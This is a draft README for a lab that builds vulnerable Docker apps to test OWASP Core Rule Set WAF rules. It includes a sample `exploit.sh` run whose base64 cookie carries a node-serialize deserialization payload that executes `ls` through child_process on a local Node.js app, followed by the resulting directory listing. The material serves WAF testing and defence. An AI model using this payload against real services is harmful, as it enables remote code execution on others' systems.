*draft*

# OWASP CRS PoC
set of scripts and dockerfile that could help in creating vulnerability PoC in order to test new OWASP CRS rules.

[![asciicast](https://asciinema.org/a/qb1fM2Q3JrWp5mga8xntLb4R3.svg)](https://asciinema.org/a/qb1fM2Q3JrWp5mga8xntLb4R3)

## Usage
just cd on a PoC dir and run `start.sh` with the CRS pull request id you want to test

```bash
$ cd nodejs-rce-pr-1487/
$ bash start.sh -p 1487
[*] Build and run all containers
Creating network "nodejsrcepr1487_app_net" with driver "bridge"
Creating modsec-crs ... 
Creating vuln-nodejs-app ... 
Creating vuln-nodejs-app
Creating vuln-nodejs-app ... done
Waiting for crs...
.
[*] CRS Ready.
[*] Pull all changes from OWASP CRS remote repository
remote: Enumerating objects: 837, done
...
```

now you can run `exploit.sh`
```bash
$ bash exploit/exploit.sh
* Rebuilt URL to: http://localhost:3000/
*   Trying 127.0.0.1...
* Connected to localhost (127.0.0.1) port 3000 (#0)
> GET / HTTP/1.1
> Host: localhost:3000
> User-Agent: curl/7.47.0
> Accept: */*
> Cookie: profile=eyJ1c2VybmFtZSI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbiAoKXsgcmV0dXJuIHJlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKS5leGVjU3luYygnbHMnLCAoZSxvdXQsZXJyKSA9PiB7IHJldHVybiBvdXQ7IH0pOyB9KCkifQo=;
> 
< HTTP/1.1 200 OK
< X-Powered-By: Express
< Content-Type: text/html; charset=utf-8
< Content-Length: 104
< ETag: W/"68-ka7ksPS6+rCrIedwIIZyHPo7ROc"
< Date: Wed, 07 Aug 2019 11:38:43 GMT
< Connection: keep-alive
< 
Hello bin
boot
dev
etc
home
lib
lib64
media
mnt
node_modules
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
* Connection #0 to host localhost left intact
```

all audit logs will be stored in:
- Concurrent JSON file in  `logs/audit`
- ModSecurity Audit log in `logs/modsec_audit.log`
- ModSecurity Debug log in `logs/modsec_debug.log`

you can quickly view all relevant logs by running:
`python3 logs/viewlog.py`


